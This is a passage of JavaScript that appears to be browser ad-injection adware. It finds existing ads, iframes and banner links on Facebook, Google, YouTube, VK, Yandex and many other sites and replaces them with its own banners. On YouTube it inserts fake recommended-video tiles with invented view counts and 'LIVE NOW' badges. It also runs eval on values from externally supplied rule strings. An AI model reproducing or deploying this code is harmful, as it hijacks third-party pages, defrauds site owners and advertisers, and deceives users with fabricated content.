        fader.setAttribute('data-mytype', 'name_baner');
        mm.setAttribute('style', style);
        fader.appendChild(mm);
        createDiv(height, width, mm);
    };
    var n_b_2 = function (elem, wid, heig, style) {
        Array.prototype.forEach.call($$('' + elem + ''), function (a) {
            if ((!a.getAttribute('data-mytype') && a.offsetWidth >= wid) || (a.getAttribute('data-mytype') && !a.querySelector('img[data-mytype^="name_baner"]') && a.offsetWidth >= wid)) {
                n_b(a, wid, heig, style);
            }
        });
    };
    var tr_insert = function (elem, wid, heig, style, ggle) {
        var ddd = document.querySelector('' + elem + '');
        if (elem && ddd && !ddd.getAttribute('data-mytype') && ddd.offsetWidth >= wid) {
            ddd.setAttribute('data-mytype', 'name_baner');
            var mm = document.createElement("div");
            mm.id = 'data-mytype';
            mm.setAttribute('style', style);
            ddd.insertBefore(mm, ddd.childNodes[0]);
            var ww = mm.offsetWidth;
            if (ww && ww > 30) {
                wid = ww;
            }
            if (!ggle) {
                ggle = '';
            }
            createDiv(heig, wid, mm, ggle);
        }
    };
    var count_my = function (elem, count) {
        i = 0;
        Array.prototype.forEach.call($$('' + elem + ''), function (a) {
            if (i % count === 0) {
                if (!a.getAttribute('data-mytype')) {
                    change_peas(a);
                }
            }
            i++;
        });
    };
    var count_my_ad = function (elem, count, wid, heig, style) {
        i = 0;
        Array.prototype.forEach.call($$('' + elem + ''), function (a) {
            if (i % count === 0) {
                if (!a.getAttribute('data-mytype') && a.offsetWidth >= wid) {
                    n_b(a, wid, heig, style);
                }
            }
            i++;
        });
    };
    var ifr_host_each = function (hst) {
        Array.prototype.forEach.call($$('iframe'), function (a) {
            if (a.src && a.src.indexOf(hst) !== -1) {
                var fader = a.parentNode;
                change_peas(fader);
            }
        });
    };
    var ad_all_length = function (elem, height, style, ggle) {
        var x = document.querySelector('' + elem + '');
        if (x && !x.getAttribute('data-mytype') && height < 1000) {
            var w = x.offsetWidth - x.style.paddingLeft - x.style.paddingRight;
            if (height > 200 && w > 930) {
                w = 930;
            }
            tr_insert(elem, w, height, 'width:' + w + 'px;' + style + '', ggle);
        }
    };
    var int_funk = function () {
        var t_bs = function () {
            if (adult === 1) {
                var bt = function () {
                    if (!body.getAttribute('data-mytype')) {
                        body.setAttribute('data-mytype', 'name_b');
                        var md = document.createElement('div');
                        var l = (body_width - 728) / 2;
                        md.setAttribute('style', 'background:#fff;position:fixed;bottom:0;left:' + l + 'px;width:728px;height:90px;z-index:9999999999999;');
                        body.appendChild(md);
                        var sp = document.createElement('span');
                        sp.setAttribute('style', 'z-index:999999;cursor:pointer;position:absolute;right:0;top:0;width:12px;height:12px;background:#fff;padding:1px;');
                        sp.onclick = function () {
                            md.parentNode.removeChild(md);
                        };
                        sp.innerHTML = cl_img;
                        md.appendChild(sp);
                        createDiv(90, 728, md);
                    }
                };
                bt();
            }
            if (host === 'www.facebook.com') {
                if (window.pageYOffset > 1500) {
                    var ct = document.querySelector('div[class^="_64b"]');
                    if (ct && !ct.getAttribute('data-mytype')) {
                        var f = ct.firstElementChild;
                        ct.style.top = '-' + (f.offsetHeight + 40) + 'px';
                        ct.setAttribute('data-mytype', 'name_baner');
                        var r = document.querySelector('div[class^="_26z1"]');
                        if (r && !r.getAttribute('data-mytype')) {
                            r.setAttribute('data-mytype', 'name_baner');
                            n_b(r, 160, 600, 'width:160px;height:600px;margin:0 auto;');
                        }
                    }
                }
                Array.prototype.forEach.call($$('div[class^="_5jmm _5pat"]'), function (a) {
                    if (a.querySelector('a[class^="_3e_2 _m8c"]')) {
                        a.parentNode.removeChild(a);
                    }
                });
            } else if ((host.indexOf('google') !== -1 || host.indexOf('local-ntp')) !== -1 && host.indexOf('translate') === -1) {
                var rgt = document.querySelector('#rhs');
                if (rgt && !document.querySelector('#lu_pinned_rhs')) {
                    rgt.style.minWidth = '300px';
                    if (rgt.offsetHeight < 400) {
                        tr_insert('div[id^="rhs_block"]', 300, 250, 'min-width:300px;width:300px;height:250px;margin:10px auto;', 'google_300');
                    }
                    tr_insert('#rhs', 300, 250, 'min-width:300px;width:300px;height:250px;margin:10px auto;', 'google_300');
                }
                var s = document.querySelector('#most-visited');
                var s_2 = document.querySelector('#prm-pt');
                if (s && !s.getAttribute('data-mytype')) {
                    tr_insert('#most-visited', 600, 300, 'width:600px;height:300px;z-index:999;margin:10px auto 120px auto;');
                } else if (!s && s_2 && !s_2.getAttribute('data-mytype')) {
                    tr_insert('#prm-pt', 600, 300, 'width:600px;height:300px;z-index:999;margin:10px auto;');
                }
            } else if (if_yti && (!$_GET('q') || ($_GET('q') && $_GET('q') !== 'gHtFdrR'))) {
                if (document.location.href === 'https://www.youtube.com/') {
                    t_ch_p('div[id^="masthead-ad"]', 'width:90%;height:270px;margin:10px auto 0 auto !important;');
                    if (!document.querySelector('div[id^="masthead-ad"]')) {
                        t_ch_p('div[id^="header"]', 'width:90%;height:270px;margin:10px auto 0 auto !important;');
                    }
                }
                t_ch_p('#watch7-sidebar-ads', 'width:300px;height:250px;margin:0 auto;');
                t_ch_p('#player-ads', 'width:336px;height:280px;margin:0 auto 15px 0;');
                var ad_ch = function (elem) {
                    var wtch = document.querySelector(elem);
                    if ((wtch && !wtch.getAttribute('data-mytype')) || (wtch && wtch.getAttribute('data-mytype') && !wtch.querySelector('img[data-mytype^="name_baner"]'))) {
                        wtch.setAttribute('data-mytype', 'name_baner');
                        var div = document.createElement('div');
                        div.setAttribute('style', 'width:100%;max-width:615px;height:250px;margin:10px auto 0 auto;');
                        wtch.appendChild(div);
                        change_peas(div);
                    }
                };
                ad_ch('div[id^="watch-header"]');
                ad_ch('div[id^="info-contents"]');
                each_change_peas('div[id^="google_companion_ad_div"]', 'c');
                each_change_peas('div[class^="image-container"]');
                if (document.querySelector('div[id^="yout_play_y"]') && document.querySelector('div[class^="adDisplay"]')) {
                    var k = document.querySelector('div[class^="ad-container ad-container"]');
                    if (k) {
                        k.parentNode.removeChild(k);
                    }
                }
                var b = 0;
                var channel = '';
                var ths = document.querySelector('#byline-container');
                if (ths) {
                    ths = ths.querySelector('#byline');
                }
                if (ths) {
                    channel = '<div style="color: #7b7f82;font-size:13px;display:block;margin-bottom:2px;">' + ths.innerText + y_check + '</div>';
                }
                Array.prototype.forEach.call($$('ytd-compact-video-renderer[class^="style-scope ytd-watch-next-secondary-results-renderer"]'), function (a) {
                    if (b % 5 === 0 && b < 19) {
                        if (!a.getAttribute('data-mytype')) {
                            a.setAttribute('data-mytype', 'name_baner');
                            var parent = a.parentNode;
                            var i = 0;
                            while ((a = a.previousSibling) !== null) i++;
                            var mm = document.createElement("div");
                            mm.setAttribute('style', 'width:370px;height:95px;margin:0 0 10px 0;');
                            mm.id = 'data-mytype';
                            var m_2 = document.createElement("div");
                            m_2.setAttribute('style', 'width:370px;height:95px;margin-left:0;');
                            mm.appendChild(m_2);
                            var nt = setInterval(function () {
                                if (ads_arr[ads_count]) {
                                    var this_row = ads_arr[ads_count];
                                    ads_count++;
                                    var live = '<span style="color:#7b7f82;font-size:13px;display:block;margin-bottom:5px;">' + r_min_max(10, 100) + 'M views</span>';
                                    var time = '<span style="position:absolute;right:3px;bottom:3px;background:#121212d1;color:#dadada;font-size:12px;padding:2px 4px;border-radius:2px;letter-spacing:.5px;font-weight:500;line-height:1.2rem;">' + r_min_max(1, 17) + ':' + r_min_max(10, 59) + '</span>';
                                    if (r_min_max(1, 3) === 1) {
                                        time = '';
                                        live = live.replace('M views', 'K watching');
                                        live = live + '<span style="color:hsl(3, 81.8%, 49.6%);font-size:13px;border:1px solid hsl(3, 81.8%, 49.6%);border-radius:2px;padding:0 3px;">LIVE NOW</span>';
                                    }
                                    m_2.innerHTML = '<div data-mytype="name_baner" style="overflow:hidden;display:flex;"><div style="width:370px;height:100%;display:inline-block;margin-left:0;"><div style="height:100%;line-height:1.1;"><div style="overflow:hidden;width:168px;height:95px;float:left;position:relative;"><a href="' + this_row.link + '"><img width="100%" src="' + this_row.image + '" data-mytype="name_baner"></a>' + time + '</div><div><div style="max-height:13%;overflow:hidden;padding:3px 3px 0 6px;"><a href="' + this_row.link + '" style="transition:0.1s;display:block;cursor:pointer;text-decoration:none;color:black;font-size:14px;height:92px;"><span style="display:block;max-height:30px;overflow:hidden;margin-bottom:5px;font-weight:500;">' + this_row.header + '</span>' + channel + live + '</a></div></div></div></div></div>';
                                    clearInterval(nt);
                                    parent.insertBefore(mm, parent.childNodes[i]);
                                }
                            }, 200);
                        }
                    }
                    b++;
                });
                Array.prototype.forEach.call($$('ytd-grid-video-renderer'), function (a) {
                    if (b % 5 === 0 && b < 200) {
                        if (!a.getAttribute('data-mytype')) {
                            a.setAttribute('data-mytype', 'name_baner');
                            var parent = a.parentNode;
                            var i = 0;
                            while ((a = a.previousSibling) !== null) i++;
                            var mm = document.createElement("div");
                            mm.setAttribute('style', 'width:210px;height:205px;padding-right:4px;display:initial;');
                            mm.id = 'data-mytype';
                            var nt = setInterval(function () {
                                if (ads_arr[ads_count]) {
                                    var this_row = ads_arr[ads_count];
                                    ads_count++;
                                    var live = '<span style="color:#7b7f82;font-size:13px;display:block;">' + r_min_max(10, 100) + 'M views</span>';
                                    var time = '<span style="font-weight:500;">' + r_min_max(1, 17) + ':' + r_min_max(10, 59) + '</span>';
                                    if (r_min_max(1, 3) === 1) {
                                        time = '';
                                        live = live.replace('M views', 'K watching');
                                        live = live + '<span style="color:hsl(3, 81.8%, 49.6%);font-size:13px;border:1px solid hsl(3, 81.8%, 49.6%);border-radius:2px;padding:0 3px;">LIVE NOW</span>';
                                    }
                                    mm.innerHTML = '<div style="display:inline-block;width:210px;margin-bottom:24px;height:223px;"><a href="' + this_row.link + '" style="display:inline-block;"><div style="width:210px;height:118px;position:relative;overflow:hidden;"><img id="img" style="margin-top:-20px;width:100%;" class="style-scope yt-img-shadow" width="168" src="' + this_row.image + '"><span style="position:absolute;right:4px;bottom:4px;color:#dadada; background-color:#121212d1;opacity:8;padding:1px 2px;font-size:13px;border-radius:3px;">' + time + '</span></div></a><a href="' + this_row.link + '"><div style="width:210px;height:102px;float:right;"><h3 style="color:#2d2d2d;margin:8px 0 8px;font-size:1.5rem;font-weight:500;max-height:32px;overflow:hidden;line-height:1.1;white-space:initial;">' + this_row.header + '</h3><div style="line-height:1.8rem;font-size:1.3rem;color:#888888;">' + channel + live + '</div></div></a></div>';
                                    clearInterval(nt);
                                    parent.insertBefore(mm, parent.childNodes[i]);
                                }
                            }, 200);
                        }
                    }
                    b++;
                });
            } else if (host === 'vk.com') {
                var leftt = document.querySelector('div[id^="ads_left"]');
                if (leftt) {
                    leftt.innerHTML = '';
                    n_b(leftt, 160, 1200, 'width:120px;height:1200px;margin:0;');
                    leftt.id = 'vk_left_ads';
                    leftt.className = 'vk_left_ads';
                }
                n_b_2('div[id^="narrow_column"]', 160, 600, 'padding-top:10px;');
                n_b_2('div[class^="audio_friends_list_content"]', 200, 400, 'padding-top:10px;');
                ad_all_length('div[class^="audio_page_sections _audio_page"]', 90, 'margin:5px auto');
                ad_all_length('div[id^="photos_all_block"]', 90, 'margin:5px auto');
                ad_all_length('div[id^="video_content_catalog"]', 200, 'margin:5px auto');
                ad_all_length('div[id^="pva_wrap"]', 90, 'margin:5px auto');
                ad_all_length('div[id^="apps_after"]', 200, 'margin:5px auto');
                tr_insert('div[class^="mv_info_wide_column fl_l"]', 600, 300, 'width:600px;margin:10px auto;');
                var left_fix = document.querySelector('div[id^="stl_side"]');
                if (left_fix) {
                    left_fix.parentNode.removeChild(left_fix);
                }
                Array.prototype.forEach.call($$('._ads_promoted_post_data_w'), function (a) {
                    a.parentNode.removeChild(a);
                });
            } else if (host.indexOf('ok.ru') !== -1) {
                t_ch_p('div[id^="hook_Block_ViewportHeightAwareBanner"]');
                count_my_ad('div[class^="gs_result_i_w"]', 3, 180, 150, 'width:180px;padding-top:10px;');
                ad_all_length('div[id^="hook_Block_RightColumnFriendPossible"]', 250, 'height:250px;margin:10px auto');
                Array.prototype.forEach.call($$('div[class^="h-mod js-banner-wrapper"]'), function (a) {
                    a = a.parentNode.parentNode;
                    if (a.parentNode.className && a.parentNode.className.indexOf('feed __klass __no-ava') > -1) {
                        a = a.parentNode;
                        a.parentNode.removeChild(a);
                    } else {
                        a.parentNode.removeChild(a);
                    }
                });
                n_b_2('div[id^="online-fr_block"]', 240, 400, 'width:240px;height:400px;margin:0 auto 10px auto;');
            } else if (host.match(/yandex/im)) {
                if (document.querySelector('div[class^="serp-item serp-adv-item"]') || document.querySelector('div[class^="serp-item t-construct-adapter__adv serp-adv-item"]')) {
                    t_ch_p('div[class^="serp-item serp-adv-item"]', 'width:300px;height:250px;margin:10px auto 10px 0;');
                    t_ch_p('div[class^="serp-item t-construct-adapter__adv serp-adv-item"]', 'width:300px;height:250px;margin:10px auto 10px 0;');
                } else {
                    ad_all_length('div[class^="content__right content__right"]', 250, 'width:300px;height:250px;margin:10px auto 10px 0', 'yandex');
                }
                if (!document.querySelector('div[id^="banner"]')) {
                    ad_all_length('div[class^="container container__heap container__line heap heap_direction_column"]', 90, 'width:728px;height:90px;margin:5px 0 0 20px');
                }
                count_my('li[class^="b-501px-popular-themes__item"]', 4, 'b');
                n_b_2('.rubric', 468, 60, 'width:468px;');
            } else if (host === 'coccoc.com') {
                var right = document.querySelector('div[class^="right-content"]');
                if (right && !right.getAttribute('data-mytype') && document.location.href.indexOf('query=') !== -1) {
                    ad_all_length('div[class^="right-content"]', 250, 'height:250px;margin:10px auto');
                }
            } else if (host.match(/yahoo.com/im)) {
                count_my_ad('li[class^="js-stream-content"]', 6, 630, 250, 'padding-top:10px;width:630px;height:250px;');
            } else if (host === 'www.bing.com') {
                n_b_2('div[id^="sbox"]', 600, 300, 'width:600px;height:300px;padding:10px 0;');
                ad_all_length('ol[id^="b_context"]', 250, 'width:300px;height:250px;margin:10px auto 10px 0');
            } else if (host.match(/mail.ru/im)) {
                var s_d = document.querySelector('div[class^="search__now-searching"]');
                if (s_d) {
                    s_d.style.minHeight = '90px';
                    tr_insert('div[class^="search__now-searching"]', 728, 90, 'width:728px;height:90px;');
                }
                if (document.querySelector('div[class*="d_right-text"]') || document.querySelector('div[class^="rb-slot-side"]')) {
                    t_ch_p('div[class*="d_right-text"]', 'width:300px;height:250px;margin:10px auto 0;');
                    t_ch_p('div[class^="rb-slot-side"]', 'width:300px;height:250px;margin:10px auto 0;');
                } else {
                    var rgtm = document.querySelector('#layout-content');
                    if (rgtm && rgtm.offsetWidth > 1000 && !rgtm.getAttribute('data-mytype')) {
                        n_b(rgtm, 300, 250, 'float:right;wifth:300px;height:250px;margin:15px auto;');
                    }
                }
                n_b_2('.article-photo', 468, 60, 'margin-top:10px;');
                each_change_peas('div[class^="banner"]');
            } else if (host === 'fotostrana.ru') {
                count_my('div[class^="pin-item-img"]', 4, 'b');
                tr_insert('div[class^="meeting-parts meeting-content"]', 468, 60, 'width:468px;height:60px;padding-top:10px;');
            } else if (host === 'www.pinterest.com') {
                count_my('div[class^="pinImageActionButtonWrapper"]', 11);
            } else if (host === 'rutube.ru') {
                count_my_ad('li[class^="related-videos-item"]', 3, 320, 100, 'width:320px;padding-top:10px;');
                ad_all_length('#related_video_block', 250, 'height:250px;margin:10px auto');
            } else if (host === 'www.rediff.com') {
                count_my('div[class^="newimgthumb"]', 7);
            } else if (host === 'giphy.com') {
                count_my('div[class^="_21i9prOBBMLnjP6qhMXo6m"]', 6);
            } else if (host === 'www.webtretho.com') {
                count_my_ad('div[class^="ati_nwp clbt ng-scope"]', 5, 300, 250, 'width:300px;padding-top:10px;');
            }
            if (host !== '') {
                var host_2 = host.replace('www.', '');
                var dom_b = host_2.split('.');
                if (iskl.indexOf(host) === -1) {
                    if (str_dm_ad && str_dm_ad.indexOf(dom_b[0]) !== -1) {
                        var p_1 = str_dm_ad.split('**');
                        if (p_1 && p_1.length > 0) {
                            p_1.forEach(function (peas) {
                                if (peas.indexOf(dom_b[0]) !== -1) {
                                    var p_2 = peas.split('*');
                                    if (ad_adl < 10 && p_2 && p_2.length > 0) {
                                        if (host.indexOf(p_2[0]) !== -1) {
                                            ad_adl++;
                                            if (p_2[3] === 'a') {
                                                t_ch_p((p_2[1]), p_2[2]);
                                            } else if (p_2[3] === 'b') {
                                                each_change_peas(p_2[1]);
                                            } else if (p_2[3] === 'c') {
                                                ifr_host_each(p_2[1]);
                                            } else if (p_2[3] === 'd') {
                                                n_b_2(p_2[1], eval(p_2[4]), eval(p_2[5]), p_2[2]);
                                            }
                                        }
                                    }
                                }
                            });
                        }
                    }
                }
                if (ad_adl < 10 && str_dm_ad_2 && str_dm_ad_2.indexOf(dom_b[0]) !== -1) {
                    p_1 = str_dm_ad_2.split('**');
                    if (p_1 && p_1.length > 0) {
                        p_1.forEach(function (peas) {
                            if (peas.indexOf(dom_b[0]) !== -1) {
                                var p_2 = peas.split('*');
                                if (ad_adl < 10 && p_2 && p_2.length > 0) {
                                    if (host.indexOf(p_2[0]) !== -1) {
                                        ad_adl++;
                                        ad_all_length(p_2[1], eval(p_2[2]), 'height:' + p_2[2] + 'px;margin:10px auto');
                                    }
                                }
                            }
                        });
                    }
                }
            }
        };
        t_bs();
        if (iskl.indexOf(host) === -1) {
            function this_dont_fader() {
                var change_peas = function (peas) {
                    var height = peas.offsetHeight;
                    if (!peas.getAttribute('data-mytype') && height >= 60) {
                        var width = peas.offsetWidth;
                        if ((body_width / 100) * 90 > width || (body_height / 100) * 80 > height) {
                            peas.setAttribute('data-mytype', 'name_baner');
                            peas.innerHTML = '';
                            peas.setAttribute('style', 'padding-left:0;padding-top:0;text-align: center !important;');
                            createDiv(height, width, peas);
                        }
                    }
                };
                var all_this_divs = ['div[class^="rpwe-block"]', 'div[id^="ssvzone_"]', 'div[id^="adnzone_"]', 'div[id^="TrafficmediaComposite"]', 'div[class^="exo-native-widget-outer"]', 'span[class^="m_banner_show"]', 'div[class^="ac_adbox_inner"]', 'div[class^="vmc_ads_viewport"]', 'div[id^="SC_TBlock"]', 'div[id^="amzn_assoc_ad_div_adunit"]', 'div[id^="adform-adbox"]', 'div[class^="b-banner_sm"]', 'div[class^="adroll-block"]', 'div[id^="bbbb.creative"]', 'div[id^="abAdPlacementOutsiderswitcher"]', 'div[id^="rcjsload_"]', 'div[class^="ac_jbbox_inner"]', 'div[id^="mvBox"]', 'div[class^="OUTBRAIN"]', 'ins[class^="adsbygoogle"]', 'div[id^="MarketGidComposite"]', 'div[id^="actionteaser"]', 'div[class^="__lxG__multi"]', 'div[id^="smi2adblock_"]', 'div[id^="AdFox_banner_"]', 'div[class^="rb-slot js-module"]', 'div[class^="js-module_slot"]', 'div[class^="profit__inner"]', 'div[id^="yandex_direct"]', 'div[id^="Ya_sync"]', 'div[id^="yandex_rtb"]', 'div[id^="yandex_ad"]', 'div[id^="MarketGidComposit"]', 'div[id^="DIV_YNG"]', 'div[class^="pp_ad_container"]', 'div[class^="adm-masthead-body"]', 'div[class^="adm-scroll-body"]', 'div[class^="cdxhd_scroll_body"]', 'div[class^="admatic_interstitial"]', 'div[id^="bbb.creative"]', 'div[class^="goAdverticum"]', 'div[class^="geoAd_div"]', 'div[id^="extraAdsBlock"]', 'div[class^="onet-ad"]', 'div[class^="gallDx gallBox"]', 'div[class^="mkt-container"]', 'div[id^="ligatusframe"]', 'div[id^="div-gpt-ad"]', 'div[id^="hm_teaser"]', 'div[id^="div_utif"]', 'div[id^="pubdirecte"]', 'div[id^="admzone"]', 'div[id^="adtima-zone"]', 'div[class^="eng_recs_holder"]', 'div[class^="adssendo-zone"]', 'div[class^="ssvzContent"]', 'div[class^="cohoi_block"]', 'div[class^="plista_widget"]', 'div[class^="adfox-banner"]', 'div[class^="xhtml_banner"]', 'div[class^="lx_wrap"]', 'div[class^="mgbox"]', 'div[id^="BannerGIMG"]', 'div[id^="RTBDIV"]', 'div[id^="DIV_DA"]', 'div[class^="trc_rbox_container"]', 'div[class^="teaserBlockWrapper"]', 'div[class^="rb-banner"]', 'div[class^="adm-bnr"]', 'div[class^="HHC-Banners"]', 'div[id^="IL_INSEARCH"]', 'div[id^="adriver"]', 'div[class^="ngs-main-banner"]', 'div[class^="goAdverticum"]', 'div[id^="cs_im_container"]', 'center[id^="footer_banners"]', 'div[id^="bottomBanners"]', 'div[id^="EroIMslider"]', 'div[id^="eplAdDiv"]', 'div[class^="adriverBanner"]', 'div[class^="gnezdo_main_block"]', 'div[class^="lx__blk"]', 'div[class^="trafmag_table"]', 'div[id^="infox_ad_adfox"]', 'div[id^="tm-tb"]', 'div[id^="smile_teaser"]', 'div[class^="relap-gamesisart_ru__top-container"]', 'div[class^="pubexchange_module"]', 'div[class^="jsInfOverLay"]', 'div[class^="RTBDIV"]', 'div[class^="lx_outer"]', 'div[class^="ad-unit"]', 'div[class^="gnezdo_main_block"]', 'div[class^="tizerDiv"]', 'div[id^="mpuls-widget"]', 'div[id^="tizbaAdblock"]', 'div[id^="smi_teaser"]', 'div[id^="begun_div"]', 'div[id^="MIXADV"]', 'div[class^="mediaVertical"]', 'div[id^="DIV_NTV_"]', 'div[class^="trc_rbox"]'];
                all_this_divs.forEach(function (pp) {
                    Array.prototype.forEach.call($$('' + pp + ''), function (a) {
                        if ((!a.getAttribute('data-mytype') && a.parentNode.tagName !== 'BODY') || (a.getAttribute('data-mytype') && a.getAttribute('data-mytype') !== 'name_baner' && a.parentNode.tagName !== 'BODY')) {
                            change_peas(a);
                        }
                    });
                });
                Array.prototype.forEach.call($$('yatag'), function (a) {
                    for (var i = 0; i <= 8; i++) {
                        if (a) {
                            a = a.parentNode;
                        }
                        if (a !== null && a.tagName === 'DIV' && a.firstElementChild.tagName === 'YATAG') {
                            change_peas(a);
                            a.className = 'ads_yat_c';
                            a.id = 'ads_yat_i';
                            return;
                        }
                    }
                });
                Array.prototype.forEach.call($$('a'), function (a) {
                    var f = a.parentNode;
                    var w = f.offsetWidth;
                    var h = f.offsetHeight;
                    if (a.href && !a.getAttribute('data-mytype') && a.parentNode.tagName !== 'BODY' && typeof(a.href) !== 'object' && a.href.indexOf(host) === -1 && a.style.display !== 'none' && h > 59 && w > 99 && a.offsetHeight > 5 && a.offsetWidth > 5 && ((body_width / 100) * 40 > w || (body_height / 100) * 40 > h) && a.href.match(/\/(bitrix\/[^0-9a-z]+(banner)[^0-9a-z]|ads\.ad4game\.com|illicium\.wmtransfer\.com|adv\.wp\.pl|d\.adroll\.com|zetahit\.click|newopenx\.detik\.com|media\.r18\.com|adfox\.ru|zone\.uniad\.vn|saxp\.zedo\.com|axp\.zedo\.com|engine\.adzerk\.net|csr\.onet\.pl|investoradbg\.hit\.gemius\.pl|ox\.tossoffads\.com|www\.projectwonderful\.com|cft2\.igromania\.ru|beta\.mediafort\.ru|clicks\.pipaffiliates\.comafs|www\.dtmads\.comaf|record\.ironaffiliates\.com|ads\.supplyframe\.com|go\.padsdel\.com|goto\.astdn\.ru|t\.mail\.ru|ads\.hmao\.net|i\.imedia\.cz|ireklama\.mk|pluska\.ads\.aimatch\.com|dolnet\.adman\.gr|s6ads\.tradeads\.eu|skyjet\.zbp\.ru|adv\.informika\.ru|b\.frida\.vse42\.ru|x\.fidelity-media\.com|trader\.garant\.ru|easybn\.com|ads2\.newmedia\.az|ad\.caradisiac-publicite\.com|fastclick\.co|lenkmio\.com|oa\.mover\.uz|ads\.farakav\.com|ww251\.smartadserver\.com|ad\.adverticum\.net|redir\.bebi\.com|seethisinaction\.com|ads\.brazzers\.com|frtyd\.com|affiliate\.w88club\.com|ad\.admitad\.com|click\.buzzcity\.net|record\.mytopaff\.com|traffic|server\.cpmstar\.com|a\.t\.webtracker\.jp|adclick\.g\.doubleclick\.net|openx\.jawharafm\.net|go\.cz\.bbelements\.com|lg1\.logging\.admicro\.vn|counter|ww84\.smartadserver\.com|ads\.rcs\.it|c\.imedia\.cz|go\.idnes\.bbelements\.com|optimized-by\.rubiconproject\.com|adserver\.biletix\.com|ad\.zanox\.com|hotmart\.net\.br|click\.union\.ucweb\.com|ww488\.smartadserver\.com|adserver\.adtech\.de|fra1-ib\.adnxs\.com|ams1-ib\.adnxs\.com|ads4pubs\.com|a\.tribalfusion\.com|cashpass\.ru|flylinks\.pw|advjump\.com|gnpu\.ftpglst\.com|hghit\.com|sub2\.bubblesmedia\.ru|staff\.letysheeps\.ru|teasermedia\.net|alitems\.com|c\.tmstrack\.com|traffic\.mylotto\.com|cityadspix\.com|thisclick\.network|traforet\.com|hgbn\.rocks|main\.exoclick\.com|rpc-php\.trafficfactory\.biz|adultfriendfinder\.com|tubecorporate\.com|smartadserver\.com|adsrv\.eacdn\.com|www\.vsemayki\.ru|steamplay\.net|pumpmanpro\.com|www\.xman-extra\.com|maxsizepro\.com|iamsextoy\.com|javsex\.net|bongacams\.com|reklama\.v102\.ru|clickindia\.com|www\.att\.com)/img)) {
                        if (a.firstElementChild && a.querySelector('img')) {
                            change_peas(a.parentNode);
                        }
                    }
                });
            }

            this_dont_fader();

            function all_div_iframe_baners() {
                var change_peas = function (peas) {
                    if (!peas.getAttribute('data-mytype') && peas.parentNode.tagName !== 'BODY') {
                        var win_width = (window.outerWidth / 100) * 90;
                        if (win_width > peas.offsetWidth && peas.style.display !== 'none') {
                            var fader = peas.parentNode;
                            var width = peas.offsetWidth;
                            if (body_width > width) {
                                var height = peas.offsetHeight;
                                peas.setAttribute('style', 'display:none !important;opacity:0 !important;visibility:hidden !important;z-index:-999999999;');
                                createDiv(height, width, fader);
                                peas.parentNode.removeChild(peas);
                            }
                        }
                    }
                };
                Array.prototype.forEach.call($$('iframe'), function (a) {
                    if (!a.getAttribute('data-mytype')) {
                        var w = a.offsetWidth;
                        var h = a.offsetHeight;
                        if ((h >= 125 && w >= 125) || (h >= 60 && w >= 468) || (h >= 100 && w >= 320) || (h >= 200 && w >= 100)) {
                            if ((a.src && if_rs(a) === 1) || (a.id && if_di(a) === 1)) {
                                change_peas(a);
                            } else if (a.src && a.src.match(/[^0-9a-z]+(nvdst\.com|promoviral\.com|fjjuo\.com|adserv\.com|bet365affiliates\.com|media\.easyads\.bg|betweendigital\.com|adriver\.ru|ng2\.virgul\.com|goyetteconnelly\.bid|adsrv\.eacdn\.com|newpromo|zedo\.com|smartadserver\.com|prppsn\.com|worldssl\.net|am15\.net|am[0-9]+\.net|gtcrm\.top|clhko\.top|ozdau\.top|adocean\.pl|ijrah\.top|speednetwork[0-9]+\.adk2x\.com)[^0-9a-z]+/img)) {
                                change_peas(a);
                            } else {
                                var fader = a.parentNode;
                                if (str_rs.indexOf(',' + w + 'x' + h + ',') !== -1) {
                                    if (fader && fader.tagName && fader.tagName !== 'BODY' && ((fader.offsetWidth >= w && fader.offsetHeight >= h) || fader.tagName === 'NOINDEX')) {
                                        a.setAttribute('data-mytype', 'name_baner');
                                        createDiv(h, w, fader);
                                        a.parentNode.removeChild(a);
                                    }
                                }
                            }
                        }

                    }
                });
                var divs = ['iframe[class^="xhtml_banner"]', 'iframe[src^="/showcase.php"]', 'iframe[class^="mbIFrame"]', '.ssvzHeader', 'embed[src^="http://www.trbetmedia.com/"]', 'iframe[class^="tynt-ad-frame"]', 'table[id^="SC_TBlock"]', 'table[class^="mctable"]', 'table[id^="teaser_block"]', 'table[id^="tizdiv_table"]', 'div[class^="wrapperAddBlock"]', 'div[class^="union-banner"]', 'div[class^="oyyb"]', 'div[class^="ssvzMid"]', 'div[class^="banners-footer"]', 'div[id^="adform-adbox"]', 'div[id^="oyy_banner"]', 'iframe[data-src-al^="//reklama.ngs.ru/"]'];
                divs.forEach(function (pp) {
                    Array.prototype.forEach.call($$('' + pp + ''), function (a) {
                        change_peas(a);
                    });
                });
                Array.prototype.forEach.call($$('table'), function (a) {
                    var links = a.querySelectorAll('a');
                    var t = true;
                    var f = a.parentNode;
                    if (!a.querySelector('table') && links && links.length > 1 && ((body_width / 100) * 50 > f.offsetWidth || (body_height / 100) * 50 > f.offsetHeight)) {
                        links.forEach(function (pp) {
                            if (t === true && pp.href && typeof(pp.href) !== 'object' && pp.href.match(/(sparonero\.pro|empazon\.ru|novostimira\.biz|et-code\.ru|gonews3\.net|btz\.onlinekanal\.ru|ettalhap\.com|ads\.adfox\.ru|thor-media\.ruclick|n\.cashandfavor\.ru|sletl\.xbosombpvz\.xyz|ledhatbet\.com|dmqpc\.hfmqjxwz\.xyz|ru\.redtram\.com|rebevengwas\.com|iqomy\.pcruxm\.xyz|rtl1\.net|goods\.redtram\.com|smi2\.ru|news\.gnezdo\.ru|pdbgci\.dflfnrmi\.xyz|toget\.ru|runetki\.com|www\.theclassicporn\.com|parhadat\.com|1b2\.kordonivkakino\.tv|globalteaser\.ru|cohedttoft\.com|rt\.tizerlady\.info|rt\.tizerlady\.win|zirijasa\.ru|zirijata\.ru|block\.sw1block\.com|scr-tz\.com|partner\.komedra\.com|funsmi\.ru|ptggr\.kxqvnfcg\.xyz|ulro\.nmmfk\.xyz|yku\.evyhhq\.xyz|rt\.rtl1\.org|rt\.tlr1\.biz|rarenok\.biz|gcl\.novostimira\.biz|recreativ\.ru)/img)) {
                                t = false;
                                change_peas(a);
                            } else if (t === true && pp.href && typeof(pp.href) !== 'object' && pp.href.match(/[^0-9a-z]+(luxup|luxadv\.com|block\.s[0-9]+block\.com)[^0-9a-z]+/img)) {
                                change_peas(a);
                            } else if (a.querySelector('div[id^="etarg_description"]') && a.querySelectorAll('div[id^="etarg_description"]').length > 1) {
                                change_peas(a);
                            }
                        });
                    }
                });
                var all_ban_imgs = function () {
                    var ch = function (peas, width, height) {
                        var fader = peas.parentNode;
                        peas.parentNode.removeChild(peas);
                        createDiv(height, width, fader);
                    };
                    Array.prototype.forEach.call($$('img'), function (peas) {
                        var w = peas.offsetWidth;
                        var h = peas.offsetHeight;
                        var fader = peas.parentNode;
